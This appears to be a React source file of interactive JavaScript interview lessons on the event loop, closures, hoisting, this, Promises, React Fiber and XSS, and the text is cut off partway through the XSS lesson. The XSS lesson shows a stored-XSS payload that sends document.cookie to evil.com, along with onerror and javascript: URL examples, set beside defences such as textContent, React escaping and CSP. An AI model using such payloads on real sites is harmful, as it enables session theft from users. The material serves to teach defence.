import React, { useState, useEffect, useRef } from 'react';

// ─────────────────────────────────────────────────────────────────────
// SHARED
// ─────────────────────────────────────────────────────────────────────
const c = {
  wrap: { fontFamily: 'Fira Code, monospace', display: 'flex', flexDirection: 'column', gap: 16 },
  card: (border = '#1e2d40', bg = '#111827') => ({ background: bg, border: `1px solid ${border}`, borderRadius: 12, padding: 20, transition: 'all 0.3s' }),
  title: (color = '#00ff88') => ({ fontSize: 11, fontWeight: 700, letterSpacing: 2, textTransform: 'uppercase', color, marginBottom: 10 }),
  code: { background: '#060910', border: '1px solid #1e2d40', borderRadius: 8, padding: 14, fontSize: 12, color: '#e2e8f0', whiteSpace: 'pre', overflowX: 'auto', lineHeight: 1.8, fontFamily: 'Fira Code, monospace' },
  btn: (color = '#4facfe', active = false) => ({ padding: '8px 16px', borderRadius: 8, fontSize: 12, fontFamily: 'Fira Code, monospace', cursor: 'pointer', border: `1px solid ${active ? color : color + '40'}`, background: active ? color + '20' : 'transparent', color: active ? color : color + 'aa', fontWeight: 600, transition: 'all 0.2s' }),
  tag: (color) => ({ fontSize: 10, padding: '3px 10px', borderRadius: 20, fontWeight: 700, border: `1px solid ${color}40`, color, background: color + '15', display: 'inline-block' }),
  prose: { fontSize: 14, color: '#e2e8f0', lineHeight: 1.9, margin: 0 },
  muted: { fontSize: 12, color: '#9ca3af', lineHeight: 1.7 },
};

// Typewriter effect
const Typewriter = ({ text, speed = 18, onDone, style = {} }) => {
  const [displayed, setDisplayed] = useState('');
  const [done, setDone] = useState(false);
  const i = useRef(0);

  useEffect(() => {
    i.current = 0;
    setDisplayed('');
    setDone(false);
    const id = setInterval(() => {
      if (i.current >= text.length) {
        clearInterval(id);
        setDone(true);
        onDone?.();
        return;
      }
      setDisplayed(text.slice(0, ++i.current));
    }, speed);
    return () => clearInterval(id);
  }, [text]);

  return <span style={style}>{displayed}{!done && <span style={{ opacity: 0.7, animation: 'blink 0.8s infinite' }}>|</span>}</span>;
};

// Reveal card — appears with animation
const RevealCard = ({ children, delay = 0, color = '#1e2d40' }) => {
  const [visible, setVisible] = useState(false);
  useEffect(() => { const t = setTimeout(() => setVisible(true), delay); return () => clearTimeout(t); }, [delay]);
  return (
    <div style={{ ...c.card(color), opacity: visible ? 1 : 0, transform: visible ? 'translateY(0)' : 'translateY(16px)', transition: 'all 0.5s ease' }}>
      {children}
    </div>
  );
};

// Poll / quiz inline
const InlinePoll = ({ question, options, correct, explanation }) => {
  const [selected, setSelected] = useState(null);
  const answered = selected !== null;
  return (
    <div style={c.card('#2a3f5f', '#0d1829')}>
      <div style={c.title('#eab308')}>🤔 Quick Check</div>
      <p style={{ ...c.prose, marginBottom: 14, fontSize: 13 }}>{question}</p>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {options.map((opt, i) => {
          const isCorrect = i === correct;
          const isSelected = i === selected;
          const color = answered ? (isCorrect ? '#00ff88' : isSelected ? '#ef4444' : '#6b7280') : '#4facfe';
          return (
            <button key={i} onClick={() => !answered && setSelected(i)}
              style={{ ...c.btn(color, answered && (isCorrect || isSelected)), textAlign: 'left', padding: '10px 14px', opacity: answered && !isCorrect && !isSelected ? 0.4 : 1 }}>
              {answered && isCorrect ? '✓ ' : answered && isSelected ? '✗ ' : `${String.fromCharCode(65 + i)}. `}{opt}
            </button>
          );
        })}
      </div>
      {answered && (
        <div style={{ marginTop: 12, padding: '10px 14px', background: selected === correct ? '#052210' : '#2a0a0a', borderRadius: 8, border: `1px solid ${selected === correct ? '#00ff8840' : '#ef444440'}`, fontSize: 13, color: selected === correct ? '#00ff88' : '#f87171', lineHeight: 1.6 }}>
          {selected === correct ? '🎉 Correct! ' : '💡 Not quite. '}{explanation}
        </div>
      )}
    </div>
  );
};

// Analogy card
const AnalogyCard = ({ emoji, title, analogy, connection }) => {
  const [flipped, setFlipped] = useState(false);
  return (
    <div style={{ ...c.card(flipped ? '#4facfe40' : '#1e2d40', flipped ? '#05152a' : '#111827'), cursor: 'pointer' }} onClick={() => setFlipped(!flipped)}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: flipped ? 12 : 0 }}>
        <span style={{ fontSize: 24 }}>{emoji}</span>
        <div>
          <div style={{ fontSize: 13, fontWeight: 700, color: '#e2e8f0' }}>{title}</div>
          <div style={{ fontSize: 11, color: '#9ca3af' }}>{flipped ? 'Hide analogy' : 'Click to see real-world analogy'}</div>
        </div>
      </div>
      {flipped && (
        <>
          <p style={{ ...c.muted, marginBottom: 10 }}>{analogy}</p>
          <div style={{ padding: '8px 12px', background: '#4facfe15', borderRadius: 6, border: '1px solid #4facfe30', fontSize: 12, color: '#4facfe' }}>🔗 In code: {connection}</div>
        </>
      )}
    </div>
  );
};

// "Did you know" fact
const DidYouKnow = ({ fact, color = '#a855f7' }) => (
  <div style={{ ...c.card(color + '40', color + '10'), display: 'flex', gap: 12, alignItems: 'flex-start' }}>
    <span style={{ fontSize: 20, flexShrink: 0 }}>💡</span>
    <div>
      <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: 2, color, marginBottom: 6 }}>DID YOU KNOW?</div>
      <p style={{ ...c.muted, fontSize: 13 }}>{fact}</p>
    </div>
  </div>
);

// Common mistake highlighter
const CommonMistake = ({ mistake, fix }) => {
  const [showFix, setShowFix] = useState(false);
  return (
    <div style={c.card('#ef444430', '#1a0a0a')}>
      <div style={c.title('#ef4444')}>⚠ Common Interview Mistake</div>
      <p style={{ ...c.muted, marginBottom: 12 }}>{mistake}</p>
      <button style={c.btn('#00ff88', showFix)} onClick={() => setShowFix(!showFix)}>
        {showFix ? '▲ Hide fix' : '✓ Show the correct answer'}
      </button>
      {showFix && (
        <div style={{ marginTop: 12, padding: '10px 14px', background: '#052210', borderRadius: 8, border: '1px solid #00ff8830', fontSize: 13, color: '#00ff88', lineHeight: 1.6 }}>
          {fix}
        </div>
      )}
    </div>
  );
};

// Step-by-step story
const StorySteps = ({ steps }) => {
  const [current, setCurrent] = useState(0);
  const [revealed, setRevealed] = useState([0]);

  const next = () => {
    const n = Math.min(steps.length - 1, current + 1);
    setCurrent(n);
    setRevealed(r => r.includes(n) ? r : [...r, n]);
  };

  return (
    <div style={c.card()}>
      <div style={c.title('#4facfe')}>📖 How It Works — Step by Step</div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {steps.map((step, i) => (
          <div key={i} style={{ display: 'flex', gap: 12, opacity: revealed.includes(i) ? 1 : 0.25, transition: 'opacity 0.4s', cursor: i <= current ? 'default' : 'pointer' }} onClick={() => i <= current && setCurrent(i)}>
            <div style={{ width: 28, height: 28, borderRadius: '50%', background: i === current ? step.color : revealed.includes(i) ? step.color + '40' : '#1e2d40', border: `2px solid ${step.color}`, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 11, fontWeight: 700, color: i === current ? '#000' : step.color, flexShrink: 0, transition: 'all 0.3s' }}>{i + 1}</div>
            <div style={{ flex: 1, paddingBottom: i < steps.length - 1 ? 12 : 0, borderBottom: i < steps.length - 1 ? '1px solid #1e2d40' : 'none' }}>
              <div style={{ fontSize: 13, fontWeight: 600, color: i === current ? step.color : '#e2e8f0', marginBottom: 4 }}>{step.title}</div>
              {revealed.includes(i) && <div style={{ fontSize: 12, color: '#9ca3af', lineHeight: 1.6 }}>{step.desc}</div>}
              {revealed.includes(i) && step.code && <div style={{ ...c.code, fontSize: 11, marginTop: 8 }}>{step.code}</div>}
            </div>
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: 8, marginTop: 14, alignItems: 'center' }}>
        <button style={c.btn('#4facfe')} onClick={() => { setCurrent(0); setRevealed([0]); }}>↺ Reset</button>
        <button style={{ ...c.btn('#00ff88', true), marginLeft: 'auto' }} onClick={next} disabled={current === steps.length - 1}>
          {current === steps.length - 1 ? '✓ Complete!' : 'Next Step →'}
        </button>
        <span style={{ fontSize: 11, color: '#9ca3af' }}>{current + 1}/{steps.length}</span>
      </div>
    </div>
  );
};

// Interview performance meter
const InterviewMeter = ({ topics }) => {
  const [revealed, setRevealed] = useState(false);
  return (
    <div style={c.card('#eab30830', '#1a1000')}>
      <div style={c.title('#eab308')}>🎯 What Interviewers Actually Ask</div>
      {!revealed
        ? <button style={c.btn('#eab308', true)} onClick={() => setRevealed(true)}>Reveal interview frequency →</button>
        : topics.map((t, i) => (
          <div key={i} style={{ marginBottom: 12 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 12, marginBottom: 5 }}>
              <span style={{ color: '#e2e8f0' }}>{t.topic}</span>
              <span style={{ color: t.freq >= 80 ? '#ef4444' : t.freq >= 60 ? '#eab308' : '#9ca3af' }}>
                {t.freq >= 80 ? '🔥 Very Often' : t.freq >= 60 ? '⚡ Often' : '📌 Sometimes'}
              </span>
            </div>
            <div style={{ height: 6, background: '#1a2332', borderRadius: 3, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: t.freq + '%', background: t.freq >= 80 ? '#ef4444' : t.freq >= 60 ? '#eab308' : '#4facfe', borderRadius: 3, transition: 'width 1s ease', transitionDelay: i * 100 + 'ms' }} />
            </div>
          </div>
        ))}
    </div>
  );
};

// ─────────────────────────────────────────────────────────────────────
// CONCEPT LEARN CONTENT — one component per concept
// ─────────────────────────────────────────────────────────────────────

export const EventLoopLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#4facfe40' delay={0}>
      <div style={c.title('#4facfe')}>🎬 The Core Problem</div>
      <p style={c.prose}>JavaScript is <strong style={{ color: '#4facfe' }}>single-threaded</strong> — it can only do one thing at a time. But websites need to fetch data, run timers, respond to clicks... all "simultaneously". How?</p>
      <p style={{ ...c.prose, marginTop: 10 }}>The answer is the <strong style={{ color: '#00ff88' }}>Event Loop</strong> — an ingenious trick that makes one thread feel like many.</p>
    </RevealCard>

    <AnalogyCard
      emoji="☕"
      title="Think of a coffee shop"
      analogy="One barista (JS thread) takes orders. Instead of standing idle while the espresso machine brews (async operation), they take the next order. When the machine beeps (callback ready), they go back and finish it. The Event Loop is the barista checking the 'ready' queue."
      connection="JS hands async work to Web APIs (the espresso machine), keeps taking new code, then processes callbacks when they're ready."
    />

    <StorySteps steps={[
      { title: 'Your code runs on the Call Stack', color: '#4facfe', desc: 'All synchronous code runs here, one line at a time. It\'s a LIFO stack — last in, first out.', code: `console.log('1'); // pushed, runs, popped
console.log('4'); // same` },
      { title: 'Async work leaves the stack', color: '#a855f7', desc: 'setTimeout, fetch, etc. are handed to Web APIs. JS doesn\'t wait — it moves to the next line immediately.', code: `setTimeout(() => console.log('2'), 0);
// ↑ handed to Web API, execution continues` },
      { title: 'Callbacks queue up', color: '#eab308', desc: 'When async work completes, callbacks wait in queues. Promises go to the HIGH-PRIORITY Microtask Queue. setTimeout goes to the lower-priority Macrotask Queue.', code: `Promise.resolve().then(() => console.log('3'));
// → microtask queue (high priority)
setTimeout(cb, 0);
// → macrotask queue (lower priority)` },
      { title: 'Event Loop drains the queues', color: '#00ff88', desc: 'Once the call stack is empty: 1) Drain ALL microtasks first, 2) Take ONE macrotask, 3) Repeat.', code: `// Final order: 1, 4, 3, 2
// sync(1) → sync(4) → microtask(3) → macrotask(2)` },
    ]} />

    <InlinePoll
      question="What will this print? console.log('A'); setTimeout(() => console.log('B'), 0); Promise.resolve().then(() => console.log('C'));"
      options={['A, B, C', 'A, C, B', 'C, A, B', 'A, B, C (all sync)']}
      correct={1}
      explanation="A is sync (runs first). B is a macrotask (setTimeout). C is a microtask (Promise). Microtasks always drain before macrotasks → A, C, B."
    />

    <CommonMistake
      mistake="'setTimeout(fn, 0) means it runs immediately after the current line' — This is one of the most common wrong answers in interviews."
      fix="setTimeout(fn, 0) means 'run after at least 0ms AND after the call stack clears AND after all microtasks drain'. It's never truly immediate. A Promise.then() always runs before it."
    />

    <DidYouKnow fact="Node.js adds process.nextTick() which runs BEFORE Promise microtasks — even higher priority. In a Node interview, this distinction can trip you up. Browser JS doesn't have nextTick." color="#a855f7" />

    <InterviewMeter topics={[
      { topic: '"What is the event loop?" (direct question)', freq: 95 },
      { topic: 'Output order questions (setTimeout vs Promise)', freq: 90 },
      { topic: 'Microtask vs macrotask priority', freq: 75 },
      { topic: 'How to avoid blocking the event loop', freq: 60 },
    ]} />
  </div>
);

export const ClosureLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#a855f740' delay={0}>
      <div style={c.title('#a855f7')}>🎬 What Problem Does This Solve?</div>
      <p style={c.prose}>In most languages, once a function finishes, its local variables are <strong style={{ color: '#ef4444' }}>gone forever</strong>. But what if you want a function to <strong style={{ color: '#a855f7' }}>remember</strong> something between calls? That's what closures do.</p>
    </RevealCard>

    <AnalogyCard
      emoji="🎒"
      title="A backpack from school"
      analogy="Imagine each function is a student who carries a backpack (their scope). When they graduate (function returns), they don't drop the backpack — they keep it. Any nested function they created also has access to that backpack forever."
      connection="The inner function's backpack contains its own variables PLUS a reference to the outer function's backpack — that reference persists even after the outer function returns."
    />

    <StorySteps steps={[
      { title: 'Outer function creates a variable', color: '#a855f7', desc: 'count lives in createCounter\'s scope. Normally it would disappear when createCounter returns.', code: `function createCounter() {
  let count = 0; // will this disappear? No!` },
      { title: 'Inner functions are created', color: '#4facfe', desc: 'These inner functions are defined inside createCounter\'s scope, so they can see count.', code: `  return {
    inc: () => ++count,
    dec: () => --count,
  };` },
      { title: 'Outer function returns', color: '#eab308', desc: 'createCounter() finishes executing. Normally count would be garbage collected. But...', code: `}
const counter = createCounter();
// createCounter is done — but count isn't gone!` },
      { title: 'Closure keeps count alive', color: '#00ff88', desc: 'Because inc and dec reference count, the JS engine keeps it alive in memory. This is the closure — the functions "closed over" the variable.', code: `counter.inc(); // count = 1
counter.inc(); // count = 2
counter.dec(); // count = 1
// count is PRIVATE — can't access counter.count` },
    ]} />

    <InlinePoll
      question={`What does this print?\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}`}
      options={['0, 1, 2', '3, 3, 3', '0, 0, 0', 'undefined x3']}
      correct={1}
      explanation="var is function-scoped — all 3 callbacks close over the SAME i variable. By the time they run, the loop is done and i = 3. Fix: use let (block-scoped) to create a new i per iteration."
    />

    <CommonMistake
      mistake="'Closures make a copy of the variable's value at the time the function is created.'"
      fix="Closures capture a REFERENCE to the variable, not its value at creation time. That's exactly why the var loop prints 3,3,3 — all closures share the same variable reference, not 3 separate copies."
    />

    <DidYouKnow fact="React's useState is powered by closures! The setter function you get back 'closes over' the state slot index in React's internal array. This is also why the Rules of Hooks say never call hooks conditionally — it would break the index." color="#a855f7" />

    <InterviewMeter topics={[
      { topic: 'Classic var loop question', freq: 90 },
      { topic: '"What is a closure?" definition', freq: 85 },
      { topic: 'Module pattern with private state', freq: 65 },
      { topic: 'Closure in React hooks', freq: 70 },
    ]} />
  </div>
);

export const HoistingLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#eab30840' delay={0}>
      <div style={c.title('#eab308')}>🎬 JavaScript Has Two Phases</div>
      <p style={c.prose}>Before running any code, JS does a <strong style={{ color: '#eab308' }}>compilation pass</strong> — it scans your entire file and registers all declarations. This is hoisting. Your code isn't literally moved, but the effect is as if it was.</p>
    </RevealCard>

    <AnalogyCard
      emoji="📋"
      title="Like an office meeting agenda"
      analogy="Before a meeting starts, someone lists every agenda item on a whiteboard (compilation phase). During the meeting (execution phase), the items are discussed in order. But because they were registered upfront, anyone can reference an item even before it's fully discussed."
      connection="var declarations are 'registered' before execution begins — they exist but have no value yet (undefined). Function declarations are fully registered with their body."
    />

    <StorySteps steps={[
      { title: 'Compilation phase: var gets registered', color: '#eab308', desc: 'JS sees "var x = 5" and registers x = undefined in memory. The assignment (= 5) is NOT hoisted — only the declaration.', code: `// What JS registers before running:
// var x → x = undefined` },
      { title: 'Compilation phase: function fully hoisted', color: '#00ff88', desc: 'Function declarations are FULLY hoisted — name AND body. You can call them before they appear in code.', code: `// Function is ready to use before this line:
greet(); // works! ✓
function greet() { console.log('hello'); }` },
      { title: 'Temporal Dead Zone for let/const', color: '#ef4444', desc: 'let and const ARE hoisted (JS knows they exist) but are NOT initialized. Accessing them before their line throws a ReferenceError.', code: `console.log(y); // ReferenceError: TDZ!
let y = 10;     // TDZ ends here` },
      { title: 'Execution: values are assigned', color: '#4facfe', desc: 'Now code runs top to bottom. var gets its value, let/const become accessible after their line.', code: `console.log(x); // undefined (declared but not set yet)
var x = 5;
console.log(x); // 5 (now assigned)` },
    ]} />

    <InlinePoll
      question="Which of these throws a ReferenceError?"
      options={['console.log(a); var a = 1;', 'console.log(b); let b = 1;', 'greet(); function greet() {}', 'Both A and B']}
      correct={1}
      explanation="var is hoisted and initialized to undefined — no error. let is in the Temporal Dead Zone — ReferenceError. Function declarations are fully hoisted — no error."
    />

    <CommonMistake
      mistake="'let and const are not hoisted — they don't exist before their declaration line.'"
      fix="They ARE hoisted — JS registers them during compilation. The difference is they're not initialized (unlike var which gets undefined). This uninitialized state is called the Temporal Dead Zone (TDZ). Saying 'not hoisted' in an interview is technically wrong."
    />

    <DidYouKnow fact="The name 'Temporal Dead Zone' was coined by Allen Wirfs-Brock during the ES6 spec design. It's 'temporal' because it's about time (the period before the declaration), not about location in code." color="#eab308" />

    <InterviewMeter topics={[
      { topic: '"What is hoisting?" definition', freq: 80 },
      { topic: 'var vs let/const hoisting behavior', freq: 85 },
      { topic: 'Temporal Dead Zone explanation', freq: 70 },
      { topic: 'Function declaration vs expression hoisting', freq: 65 },
    ]} />
  </div>
);

export const ThisLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#4facfe40' delay={0}>
      <div style={c.title('#4facfe')}>🎬 The Most Confusing Part of JavaScript</div>
      <p style={c.prose}><strong style={{ color: '#4facfe' }}>this</strong> doesn't mean what you think. In Java/C++, this always refers to the instance. In JavaScript, <strong style={{ color: '#ef4444' }}>this is determined by HOW a function is called</strong>, not where it's defined.</p>
      <p style={{ ...c.prose, marginTop: 10 }}>One function can have a completely different this value depending on who calls it.</p>
    </RevealCard>

    <AnalogyCard
      emoji="🎭"
      title="An actor playing different roles"
      analogy="The same actor (function) can play a detective, a teacher, or a villain depending on the movie (calling context). The actor doesn't change — the role does. Similarly, the same function has a different 'this' depending on how it's called."
      connection="obj.greet() → this is obj. greet() → this is undefined. greet.call(other) → this is other."
    />

    <StorySteps steps={[
      { title: 'Rule 1: Implicit — object before the dot', color: '#4facfe', desc: 'When you call a method on an object, the object becomes this.', code: `const obj = { name: 'Dev', greet() { console.log(this.name); } };
obj.greet(); // this = obj → 'Dev'` },
      { title: 'The binding gets lost!', color: '#ef4444', desc: 'Detach the method from the object and you lose the binding. This trips up almost every developer.', code: `const fn = obj.greet;
fn();          // this = undefined (strict mode)
setTimeout(obj.greet, 0); // also loses binding!` },
      { title: 'Rule 2: Explicit — call/apply/bind', color: '#00ff88', desc: 'Force this to be whatever you want. call/apply invoke immediately, bind creates a new permanently-bound function.', code: `fn.call(obj);        // this = obj → 'Dev'
fn.apply(obj);       // same
const bound = fn.bind(obj);
bound();             // always obj, even if detached` },
      { title: 'Arrow functions: no own this', color: '#eab308', desc: 'Arrow functions inherit this from their surrounding scope at DEFINITION time. Perfect for callbacks.', code: `class Timer {
  start() {
    setInterval(() => {
      this.tick(); // ✓ 'this' = Timer (lexical)
    }, 1000);
  }
}` },
    ]} />

    <InlinePoll
      question="What does this log?\nconst obj = { x: 42, getX: function() { return this.x; } };\nconst { getX } = obj;\nconsole.log(getX());"
      options={['42', 'undefined', 'TypeError', 'null']}
      correct={1}
      explanation="Destructuring detaches getX from obj. When called as a standalone function, this is undefined (strict mode) or window (non-strict). Either way, this.x is undefined."
    />

    <CommonMistake
      mistake="Using a regular function as a React event handler and being confused why 'this' is undefined: class Comp extends React.Component { handleClick() { console.log(this.state); } render() { return <button onClick={this.handleClick}>Click</button> } }"
      fix="When React calls handleClick, it's a detached function call — this is undefined. Fix: use arrow class field (handleClick = () => {...}) or bind in constructor: this.handleClick = this.handleClick.bind(this). This is why modern React uses function components + hooks."
    />

    <DidYouKnow fact="Arrow functions were partly designed to solve the 'this problem' in callbacks. Before ES6, the common workaround was 'var self = this' or 'var that = this' to capture the outer this. You'll still see this in legacy codebases." color="#4facfe" />

    <InterviewMeter topics={[
      { topic: '4 binding rules (default, implicit, explicit, new)', freq: 80 },
      { topic: 'Arrow function vs regular function this', freq: 85 },
      { topic: 'Lost binding in callbacks/setTimeout', freq: 75 },
      { topic: 'call vs apply vs bind differences', freq: 65 },
    ]} />
  </div>
);

export const PromiseLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#06b6d440' delay={0}>
      <div style={c.title('#06b6d4')}>🎬 The Problem With Callbacks</div>
      <p style={c.prose}>Before Promises, async code used callbacks. This led to <strong style={{ color: '#ef4444' }}>Callback Hell</strong> — deeply nested, impossible-to-read code. Promises solved this with a cleaner model.</p>
      <div style={{ ...c.code, marginTop: 12, fontSize: 11 }}>{`// Callback hell 😱
getUser(id, (user) => {
  getPosts(user, (posts) => {
    getComments(posts[0], (comments) => {
      // ... keep going
    });
  });
});

// Promise chain 😌
getUser(id)
  .then(user => getPosts(user))
  .then(posts => getComments(posts[0]))
  .then(comments => display(comments));`}</div>
    </RevealCard>

    <AnalogyCard
      emoji="🎫"
      title="A restaurant pager"
      analogy="When you order food, the waiter gives you a pager (the Promise). It's currently 'pending'. When your food is ready, it either buzzes (fulfilled) or flashes red (rejected). You don't stand at the counter waiting — you go sit down and respond when notified."
      connection="const order = fetch('/api/food'); // pending. order.then(eat).catch(complain) — you register handlers and walk away."
    />

    <StorySteps steps={[
      { title: 'Creating a Promise', color: '#06b6d4', desc: 'A Promise wraps an async operation. The executor function runs immediately. Call resolve() on success, reject() on failure.', code: `const promise = new Promise((resolve, reject) => {
  fetch('/api/data')
    .then(res => resolve(res.json()))
    .catch(err => reject(err));
});` },
      { title: 'Three states — one-way transitions', color: '#eab308', desc: 'Pending → Fulfilled or Pending → Rejected. Once settled, state NEVER changes. A fulfilled promise can never become rejected.', code: `// Pending: waiting
// Fulfilled: resolve(value) was called
// Rejected: reject(reason) was called
// Can never go back to pending!` },
      { title: 'Chaining with .then()', color: '#00ff88', desc: '.then() always returns a NEW promise. Whatever you return from .then() becomes the value for the next .then(). Forgetting to return is a classic bug.', code: `fetch('/api/user')
  .then(res => res.json())      // return the promise!
  .then(user => user.name)      // gets user object
  .then(name => console.log(name)); // gets name string` },
      { title: 'Error handling with .catch()', color: '#ef4444', desc: '.catch() catches ANY rejection that bubbles up the chain. It skips all .then() callbacks after a rejection.', code: `fetch('/api/data')
  .then(res => res.json())    // skipped if fetch fails
  .then(data => process(data)) // skipped if above fails
  .catch(err => handleError(err)) // catches all errors
  .finally(() => setLoading(false)); // always runs` },
    ]} />

    <InlinePoll
      question="What does the next .then() receive if you forget to return in a .then() callback?"
      options={['The original Promise value', 'undefined', 'null', 'The previous .then() result']}
      correct={1}
      explanation="If you don't return anything from .then(), the next handler receives undefined. This is one of the most common Promise bugs — always return the next operation!"
    />

    <CommonMistake
      mistake="Creating a 'Promise constructor anti-pattern': new Promise((resolve, reject) => { fetch('/api').then(resolve).catch(reject); }) — wrapping an already-promise-returning function in a new Promise."
      fix="Just return the promise directly: return fetch('/api'). Only use new Promise() when wrapping non-promise async things (like setTimeout or callback-based APIs like fs.readFile)."
    />

    <DidYouKnow fact="Promise.all() was inspired by Haskell's 'parallel' operator. Fun fact: if you pass an empty array to Promise.all([]), it resolves immediately with []. This catches developers off guard in edge cases." color="#06b6d4" />

    <InterviewMeter topics={[
      { topic: 'Promise.all vs allSettled vs race vs any', freq: 85 },
      { topic: 'Promise chaining and .then() return values', freq: 80 },
      { topic: 'Promise states and transitions', freq: 70 },
      { topic: 'async/await vs Promise chains', freq: 75 },
    ]} />
  </div>
);

export const FiberLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#4facfe40' delay={0}>
      <div style={c.title('#4facfe')}>🎬 The Problem React Had to Solve</div>
      <p style={c.prose}>React 15's reconciler had a fatal flaw: rendering was <strong style={{ color: '#ef4444' }}>synchronous and unstoppable</strong>. A large component tree could freeze the UI for hundreds of milliseconds — no input response, no animations, nothing.</p>
      <p style={{ ...c.prose, marginTop: 10 }}>React 16 rewrote the entire reconciler from scratch. The result was <strong style={{ color: '#4facfe' }}>Fiber</strong>.</p>
    </RevealCard>

    <AnalogyCard
      emoji="🏗"
      title="Building a skyscraper vs renovating room by room"
      analogy="The old reconciler was like building an entire skyscraper in one uninterrupted push — nobody could enter the building until it was done. Fiber is like renovating room by room, letting tenants use finished rooms while others are still being worked on."
      connection="Fiber splits rendering into small units of work ('fibers'). After each unit, it checks: 'Is there something more urgent (like user input)? If yes, pause and handle that first.'"
    />

    <StorySteps steps={[
      { title: 'Old reconciler: synchronous, blocking', color: '#ef4444', desc: 'React 15 walked the component tree recursively. Once started, it ran to completion. 500 components = 500ms of frozen UI.', code: `// Old way (simplified):
function reconcile(node) {
  updateNode(node);
  node.children.forEach(reconcile); // blocking recursive call
  // can't pause, can't interrupt
}` },
      { title: 'Fiber: a linked list of work units', color: '#4facfe', desc: 'Fiber converts the tree into a linked list. Each node is a "fiber" with a reference to its parent, child, and sibling. This allows the work to be paused and resumed.', code: `// Each fiber has:
{ type, props, stateNode,
  child, sibling, return, // tree pointers
  pendingProps, memoizedProps, // state
  effectTag, nextEffect // what changed
}` },
      { title: 'Work loop: check deadline', color: '#eab308', desc: 'Fiber processes one unit of work, then checks if the browser needs to do something else. If yes, it pauses. The work continues on the next frame.', code: `while (nextUnitOfWork && !shouldYield()) {
  nextUnitOfWork = performWork(nextUnitOfWork);
}
// shouldYield() checks if browser needs main thread` },
      { title: 'Two phases: render + commit', color: '#00ff88', desc: 'Render phase (interruptible): builds the new fiber tree in memory. Commit phase (synchronous): applies all DOM changes at once. Side effects only happen in commit.', code: `// Render phase: can be interrupted
buildWorkInProgressTree(root);
// Commit phase: synchronous, fast
applyAllChanges(finishedWork);` },
    ]} />

    <InlinePoll
      question="What does useTransition do in React 18 that's powered by Fiber?"
      options={['Adds CSS transitions to components', 'Marks state updates as low priority so urgent updates (like typing) aren\'t blocked', 'Delays component mounting', 'Improves animation performance']}
      correct={1}
      explanation="useTransition lets React know that a state update is non-urgent. Fiber can then interrupt and defer that work when higher-priority updates (user input) come in."
    />

    <CommonMistake
      mistake="Thinking the Render phase and Commit phase are the same thing, or that side effects can happen during render."
      fix="The Render phase is PURE — no side effects. It just builds the work-in-progress tree and can be interrupted. The Commit phase is when React actually touches the DOM and runs effects (useEffect, useLayoutEffect). This separation is critical for Concurrent Mode correctness."
    />

    <DidYouKnow fact="React's Fiber rewrite took the team over 2 years (2016-2017). The team maintained full backward compatibility — existing React apps just got faster without any code changes. This is considered one of the most impressive large-scale refactors in open source history." color="#4facfe" />

    <InterviewMeter topics={[
      { topic: 'What problem Fiber solves', freq: 80 },
      { topic: 'Render phase vs commit phase', freq: 75 },
      { topic: 'Concurrent Mode / useTransition', freq: 70 },
      { topic: 'Why rendering can be interrupted now', freq: 65 },
    ]} />
  </div>
);

export const XSSLearn = () => (
  <div style={c.wrap}>
    <RevealCard color='#ef444440' delay={0}>
      <div style={c.title('#ef4444')}>🎬 What Can An Attacker Actually DO?</div>
      <p style={c.prose}>XSS lets attackers run their JavaScript in your users' browsers. That means: <strong style={{ color: '#ef4444' }}>steal session cookies, keylog passwords, redirect to phishing sites, make API calls as the user, deface your UI</strong>. It's the most common web vulnerability.</p>
    </RevealCard>

    <AnalogyCard
      emoji="📦"
      title="A contaminated food supply chain"
      analogy="Imagine a restaurant (your site) that buys pre-made food from a supplier (user input). If the supplier secretly adds poison (malicious script) and the restaurant serves it without checking (innerHTML), every customer gets poisoned."
      connection="Your site is trusted by browsers. If attacker script runs on your domain, it has full access to cookies, localStorage, and can make authenticated API calls."
    />

    <StorySteps steps={[
      { title: 'Stored XSS: the most dangerous', color: '#ef4444', desc: 'Attacker submits a comment containing a script. Your app saves it to the database. Every user who views the page runs the script.', code: `// User submits this comment:
"Great article! <script>
  fetch('https://evil.com?c=' + document.cookie)
</script>"
// You save it. 1000 users view it. 1000 sessions stolen.` },
      { title: 'How innerHTML enables it', color: '#f97316', desc: 'innerHTML parses its argument as HTML, executing any scripts or event handlers. textContent treats everything as literal text — never executes HTML.', code: `// ❌ Dangerous
element.innerHTML = userInput; // executes scripts!

// ❌ Also dangerous
element.innerHTML = '<img src=x onerror="' + userInput + '">';

// ✅ Safe
element.textContent = userInput; // always literal` },
      { title: 'React protects you... mostly', color: '#eab308', desc: 'React\'s JSX escapes all values by default. But dangerouslySetInnerHTML bypasses this completely. And href with user input can still run javascript: URLs.', code: `// ✅ Safe — React escapes this
<div>{userInput}</div>

// ❌ Bypasses React protection
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ❌ javascript: URL still executes!
<a href={userInput}>Click me</a> // if input = "javascript:alert(1)"` },
      { title: 'Content Security Policy: the real defense', color: '#00ff88', desc: 'CSP headers tell the browser which scripts are allowed to run. Even if attacker injects a script, the browser refuses to run it.', code: `// Express middleware
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +       // only load from own domain
  "script-src 'self'; " +        // no inline scripts
  "object-src 'none';"           // no Flash/objects
);` },
    ]} />

    <InlinePoll
      question="An attacker posts this as a comment: <img src='x' onerror='stealCookies()'>. Your app uses innerHTML to display comments. What happens?"
      options={['Nothing — img tags are safe', 'The broken image triggers onerror, executing stealCookies()', 'The browser blocks it automatically', 'Only happens with <script> tags']}
      correct={1}
      explanation="Event handlers like onerror are executed when inserted via innerHTML. You don't need <script> tags — any event handler attribute works. Always use textContent for untrusted content."
    />

    <CommonMistake
      mistake="'We use React, so we're protected from XSS.'"
